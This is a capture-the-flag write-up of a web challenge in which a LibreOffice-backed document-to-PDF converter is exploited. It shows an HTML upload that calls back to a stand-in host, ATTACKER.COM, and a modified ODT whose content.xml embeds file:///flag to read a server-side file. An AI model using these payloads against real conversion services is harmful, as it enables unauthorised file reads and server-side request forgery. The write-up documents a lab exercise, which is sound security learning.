<h1>Document-Converter</h1>

<blockquote>
  <p>Free converter for everyone.\
  You find the flag at : /flag\
  <strong>Link:</strong> http://20.233.9.240:1920</p>
</blockquote>

<p>We are given a black-box web challenge. This application allows us to upload files in various formats (.doc, .jpg, etc.) and converts them into a PDF for us to download.</p>

<p><img src="../../.gitbook/assets/Screenshot 2022-04-11 at 11.22.17 AM.png" alt="" /></p>

<p>The first thing that came to mind was whether I can upload arbitrary HTML, since HTML has plenty of potential SSRF / file inclusion vectors. Sure enough, when I uploaded the following HTML file, I got a callback to my server.</p>

<p><code>markup
&lt;link rel=stylesheet href='http://ATTACKER.COM/exploit.css'&gt;
&lt;html&gt;
    &lt;body&gt;
        Hello world.
    &lt;/body&gt;
&lt;/html&gt;
</code></p>

<p>The <code>User-Agent</code> showed that LibreOffice was making the callback.</p>

<p><code>http
OPTIONS /exploit.css HTTP/1.1
Host: a255-42-60-216-15.ngrok.io
User-Agent: LibreOffice
Cache-Control: no-cache
Pragma: no-cache
X-Forwarded-For: 20.233.9.240
X-Forwarded-Proto: http
Accept-Encoding: gzip
</code></p>

<p>Interesting! So LibreOffice is being used to convert the documents. I searched around a bit and came across <a href="https://www.l0l.xyz/sec/2021/01/05/1-webdesktop-root-ssrf.html">this writeup</a> on SSRF using LibreOffice documents.</p>

<p>We create a sample LibreOffice word document, <code>poc.odt</code>. After unzipping the ODT file, we can modify the <code>content.xml</code> file to include our payload. We create a <code>text:section</code> tag that links to the <code>/flag</code> file.</p>

<p>```markup
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content ...&gt;
    <office:body>
       <office:text></p>

<pre><code>            ...

            &lt;text:section text:name="string"&gt;&lt;text:section-source
                            xlink:href="file:///flag" xlink:type="simple" xlink:show="embed"
                            xlink:actuate="onLoad"/&gt;&lt;/text:section&gt;
    &lt;/office:text&gt;
&lt;/office:body&gt;
</code></pre>

<p></office:document-content>
```</p>

<p>Then, zipping the files again into a <code>modified.odt</code> gives us our payload. Uploading this to the server gives us the flag!</p>

<p><img src="../../.gitbook/assets/Screenshot_2022-04-10_at_8.00.58_PM.png" alt="" /></p>
